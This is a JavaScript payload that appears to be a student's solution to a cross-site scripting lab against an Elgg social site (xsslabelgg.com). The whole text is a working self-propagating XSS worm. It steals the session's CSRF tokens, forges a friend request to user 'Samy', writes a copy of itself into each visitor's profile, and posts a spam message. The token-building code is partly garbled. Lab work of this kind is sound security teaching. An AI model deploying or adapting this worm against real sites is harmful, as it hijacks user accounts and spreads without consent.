<script id="worm" type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	 //obseved the  request url and edited 
    var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN
	//Create and send Ajax request to add friend
    //obseved the elgg variable in the beginning of the body and found that under elgg.session.user.guid there is user id of current user
    if(elgg.session.user.guid!=47)
    {
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        sendurl="http://www.xsslabelgg.com/action/profile/edit";
        content="__elgg_token="+token+"&__elgg_ts="+ts+"&name="+elgg.session.user.name+"&description="+wormCode+"&accesslevel[description]=1&briefdescription=Shukti is awesome&accesslevel[briefdescription]=1&location=Konoha&accesslevel[location]=1&interests=Gaming&accesslevel[interests]=1&skills=Sleeping&accesslevel[skills]=1&contactemail=Something@Something.com&accesslevel[contactemail]=1&phone=01521443808&accesslevel[phone]=1&mobile=8899&accesslevel[mobile]=1&website=http://www.fbac.com&accesslevel[website]=1&twitter=tytt&accesslevel[twitter]=1&guid="+elgg.session.user.guid;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
        sendurl="http://www.xsslabelgg.com/action/thewire/add";
        content="__elgg_token="+token+"&__elgg_ts="+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2Cvisit+now+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy";
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
        //combined previous three steps and used the given skeleton to retrieve the copy of itself from the web page and added to victim's about

    }
	}
</script>
